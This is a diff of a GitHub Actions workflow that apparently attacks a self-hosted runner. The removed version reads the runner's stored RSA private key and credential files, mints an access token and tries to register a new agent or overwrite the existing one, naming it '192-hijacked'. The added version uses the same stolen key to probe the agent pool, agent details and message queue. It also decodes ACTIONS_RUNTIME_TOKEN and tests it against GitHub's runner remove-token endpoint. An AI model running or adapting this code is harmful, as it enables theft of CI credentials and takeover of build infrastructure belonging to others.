@@ -1,217 +1,74 @@
-name: Test Runner Token
 on: [push]
 jobs:
   find:
     runs-on: self-hosted
     steps:
-      - name: Register New Agent Final
+      - name: Probe remaining paths
         run: |
           RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
-          
           pip3 install cryptography PyJWT --break-system-packages 2>/dev/null
-          
+
           python3 -c "
-          import json, time, base64, jwt
-          import urllib.request, urllib.parse, urllib.error
+          import json, time, base64, jwt, urllib.request, urllib.parse, urllib.error
           from cryptography.hazmat.backends import default_backend
-          from cryptography.hazmat.primitives.asymmetric import rsa
-          from cryptography.hazmat.primitives.asymmetric.rsa import (
-              RSAPrivateNumbers, RSAPublicNumbers
-          )
-          
-          with open('$RUNNER_BASE/.credentials_rsaparams', 'r', encoding='utf-8-sig') as f:
-              params = json.load(f)
-          with open('$RUNNER_BASE/.credentials', 'r', encoding='utf-8-sig') as f:
-              creds = json.load(f)
-          with open('$RUNNER_BASE/.runner', 'r', encoding='utf-8-sig') as f:
-              runner = json.load(f)
-          
-          def b64_to_int(b64):
-              b64 += '=' * (4 - len(b64) % 4)
-              return int.from_bytes(base64.urlsafe_b64decode(b64), 'big')
-          
-          def int_to_b64(n):
-              length = (n.bit_length() + 7) // 8
-              return base64.urlsafe_b64encode(
-                  n.to_bytes(length, 'big')
-              ).rstrip(b'=').decode()
-          
-          private_numbers = RSAPrivateNumbers(
-              p=b64_to_int(params['p']),
-              q=b64_to_int(params['q']),
-              d=b64_to_int(params['d']),
-              dmp1=b64_to_int(params['dp']),
-              dmq1=b64_to_int(params['dq']),
-              iqmp=b64_to_int(params['inverseQ']),
-              public_numbers=RSAPublicNumbers(
-                  e=b64_to_int(params['exponent']),
-                  n=b64_to_int(params['modulus'])
-              )
-          )
-          private_key = private_numbers.private_key(default_backend())
-          
+          from cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateNumbers, RSAPublicNumbers
+
+          with open('$RUNNER_BASE/.credentials_rsaparams', encoding='utf-8-sig') as f: params = json.load(f)
+          with open('$RUNNER_BASE/.credentials', encoding='utf-8-sig') as f: creds = json.load(f)
+          with open('$RUNNER_BASE/.runner', encoding='utf-8-sig') as f: runner = json.load(f)
+
+          def b64i(b): b += '='*(4-len(b)%4); return int.from_bytes(base64.urlsafe_b64decode(b),'big')
+
+          priv = RSAPrivateNumbers(b64i(params['p']),b64i(params['q']),b64i(params['d']),b64i(params['dp']),b64i(params['dq']),b64i(params['inverseQ']),RSAPublicNumbers(b64i(params['exponent']),b64i(params['modulus']))).private_key(default_backend())
+
           client_id = creds['data']['clientId']
-          auth_url = creds['data']['authorizationUrl']
+          auth_url  = creds['data']['authorizationUrl']
           server_url = runner['serverUrl']
-          pool_id = runner['poolId']
-          agent_id = runner['agentId']
-          
-          # Get access token
+          pool_id    = runner['poolId']
+          agent_id   = runner['agentId']
+
           now = int(time.time())
-          payload = {
-              'sub': client_id,
-              'iss': client_id,
-              'aud': auth_url,
-              'nbf': now,
-              'exp': now + 270,
-              'jti': str(now)
-          }
-          client_assertion = jwt.encode(
-              payload, private_key, algorithm='RS256'
-          )
-          form_data = urllib.parse.urlencode({
-              'grant_type': 'client_credentials',
-              'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
-              'client_assertion': client_assertion,
-              'client_id': client_id
-          }).encode()
-          
-          req = urllib.request.Request(
-              auth_url, method='POST', data=form_data,
-              headers={
-                  'Content-Type': 'application/x-www-form-urlencoded',
-                  'Accept': 'application/json'
-              }
-          )
-          with urllib.request.urlopen(req) as resp:
-              access_token = json.loads(resp.read().decode())['access_token']
-              print('Access Token Obtained!')
-          
-          # Generate new RSA key
-          new_key = rsa.generate_private_key(
-              public_exponent=65537,
-              key_size=2048,
-              backend=default_backend()
-          )
-          pub_nums = new_key.public_key().public_numbers()
-          
-          auth_header = {
-              'Authorization': f'Bearer {access_token}',
-              'Accept': 'application/json',
-              'Content-Type': 'application/json'
-          }
-          
-          # Path 1: Fix agent wrapper name field
-          # Try different capitalizations and field names
-          name_formats = [
-              {'agent': {'Name': 'test-runner-99', 'version': '2.333.1', 'authorization': {'publicKey': {'exponent': int_to_b64(pub_nums.e), 'modulus': int_to_b64(pub_nums.n)}}}},
-              {'agent': {'agentName': 'test-runner-99', 'version': '2.333.1', 'authorization': {'publicKey': {'exponent': int_to_b64(pub_nums.e), 'modulus': int_to_b64(pub_nums.n)}}}},
-              {'agent': {'name': 'test-runner-99', 'Name': 'test-runner-99', 'version': '2.333.1', 'authorization': {'publicKey': {'exponent': int_to_b64(pub_nums.e), 'modulus': int_to_b64(pub_nums.n)}}}},
-          ]
-          
-          print('\n=== PATH 1: Fix agent.Name ===')
-          for i, body in enumerate(name_formats):
-              print(f'\n--- Name Format {i+1} ---')
-              try:
-                  req = urllib.request.Request(
-                      f'{server_url}_apis/distributedtask/pools/{pool_id}/agents?api-version=6.0-preview',
-                      method='POST',
-                      data=json.dumps(body).encode(),
-                      headers=auth_header
-                  )
-                  with urllib.request.urlopen(req) as resp:
-                      print(f'SUCCESS!', resp.read().decode()[:300])
-              except urllib.error.HTTPError as e:
-                  print(f'HTTP {e.code}:', e.read().decode()[:200])
-          
-          # Path 2: Format 4 gave 403 with 6.0-preview
-          # Try to fix permission issue
-          # 403 = ServiceIdentity needs View permission
-          # Try with different scopes or token
-          print('\n=== PATH 2: Fix 403 Permission ===')
-          
-          # Try Format 4 body which got 403
-          body_f4 = {
-              'name': 'test-runner-99',
-              'version': '2.333.1',
-              'publicKey': {
-                  'exponent': int_to_b64(pub_nums.e),
-                  'modulus': int_to_b64(pub_nums.n)
-              },
-              'labels': [
-                  {'name': 'self-hosted', 'type': 'system'}
-              ]
-          }
-          
-          # Try different auth approaches for 403
-          print('\n--- Format 4 With Different Accept Headers ---')
-          accept_headers = [
-              'application/json',
-              'application/json;api-version=6.0-preview',
-              'application/json;api-version=6.0-preview.1',
-              '*/*'
-          ]
-          
-          for accept in accept_headers:
-              print(f'\nAccept: {accept}')
-              try:
-                  req = urllib.request.Request(
-                      f'{server_url}_apis/distributedtask/pools/{pool_id}/agents?api-version=6.0-preview',
-                      method='POST',
-                      data=json.dumps(body_f4).encode(),
-                      headers={
-                          'Authorization': f'Bearer {access_token}',
-                          'Accept': accept,
-                          'Content-Type': 'application/json'
-                      }
-                  )
-                  with urllib.request.urlopen(req) as resp:
-                      print(f'SUCCESS!', resp.read().decode()[:300])
-              except urllib.error.HTTPError as e:
-                  print(f'HTTP {e.code}:', e.read().decode()[:300])
-          
-          # Path 3: Check what token scopes we actually have
-          print('\n=== PATH 3: Check Token Scopes ===')
-          
-          # Decode access token to see claims
+          tok = jwt.encode({'sub':client_id,'iss':client_id,'aud':auth_url,'nbf':now,'exp':now+270,'jti':str(now)}, priv, algorithm='RS256')
+          data = urllib.parse.urlencode({'grant_type':'client_credentials','client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer','client_assertion':tok,'client_id':client_id}).encode()
+          req = urllib.request.Request(auth_url, method='POST', data=data, headers={'Content-Type':'application/x-www-form-urlencoded','Accept':'application/json'})
+          with urllib.request.urlopen(req) as r: access_token = json.loads(r.read())['access_token']
+          print('Token obtained')
+
+          h = {'Authorization': f'Bearer {access_token}', 'Accept': 'application/json'}
+
+          # 1. List all agents in pool (GenericRead should allow this)
+          print('\n=== GET all agents in pool ===')
           try:
-              decoded = jwt.decode(
-                  access_token,
-                  options={'verify_signature': False}
-              )
-              print('Token Claims:', json.dumps(decoded, indent=2))
-          except Exception as ex:
-              print('Decode error:', ex)
-              # Try manual base64 decode
-              parts = access_token.split('.')
-              if len(parts) >= 2:
-                  payload_b64 = parts[1]
-                  payload_b64 += '=' * (4 - len(payload_b64) % 4)
-                  decoded_payload = base64.urlsafe_b64decode(payload_b64)
-                  print('Raw Token Payload:', decoded_payload.decode('utf-8', errors='replace'))
-          
-          # Path 4: Try updating existing agent instead
-          print('\n=== PATH 4: Update Existing Agent ===')
-          update_body = {
-              'name': '192-hijacked',
-              'version': '2.333.1',
-              'authorization': {
-                  'publicKey': {
-                      'exponent': int_to_b64(pub_nums.e),
-                      'modulus': int_to_b64(pub_nums.n)
-                  }
-              }
-          }
-          
+            req = urllib.request.Request(f'{server_url}_apis/distributedtask/pools/{pool_id}/agents?api-version=6.0-preview', headers=h)
+            with urllib.request.urlopen(req) as r: print(r.read().decode()[:1000])
+          except urllib.error.HTTPError as e: print(f'HTTP {e.code}:', e.read().decode()[:300])
+
+          # 2. Get own agent details
+          print('\n=== GET own agent details ===')
           try:
-              req = urllib.request.Request(
-                  f'{server_url}_apis/distributedtask/pools/{pool_id}/agents/{agent_id}?api-version=6.0-preview',
-                  method='PUT',
-                  data=json.dumps(update_body).encode(),
-                  headers=auth_header
-              )
-              with urllib.request.urlopen(req) as resp:
-                  print(f'UPDATE SUCCESS!', resp.read().decode()[:300])
-          except urllib.error.HTTPError as e:
-              print(f'HTTP {e.code}:', e.read().decode()[:300])
+            req = urllib.request.Request(f'{server_url}_apis/distributedtask/pools/{pool_id}/agents/{agent_id}?api-version=6.0-preview&includeCapabilities=true&includeAssignedRequest=true', headers=h)
+            with urllib.request.urlopen(req) as r: print(r.read().decode()[:1000])
+          except urllib.error.HTTPError as e: print(f'HTTP {e.code}:', e.read().decode()[:300])
+
+          # 3. Get message queue (RunnerListen scope) - what job data is exposed?
+          print('\n=== GET message queue ===')
+          try:
+            req = urllib.request.Request(f'{server_url}_apis/distributedtask/pools/{pool_id}/messages?api-version=6.0-preview&sessionId=dummy', headers=h)
+            with urllib.request.urlopen(req) as r: print(r.read().decode()[:1000])
+          except urllib.error.HTTPError as e: print(f'HTTP {e.code}:', e.read().decode()[:300])
           "
+
+          # 4. Capture and decode ACTIONS_RUNTIME_TOKEN
+          echo ""
+          echo "=== ACTIONS_RUNTIME_TOKEN decoded ==="
+          if [ -n "$ACTIONS_RUNTIME_TOKEN" ]; then
+            echo $ACTIONS_RUNTIME_TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null
+            echo ""
+            echo "=== Test ACTIONS_RUNTIME_TOKEN vs remove-token REST endpoint ==="
+            curl -s -w "\nHTTP_STATUS: %{http_code}" -X POST \
+              -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+              -H "Accept: application/vnd.github.v3+json" \
+              https://api.github.com/repos/poweriswill/oppo/actions/runners/remove-token
+          else
+            echo "ACTIONS_RUNTIME_TOKEN not available as env var"
+          fi
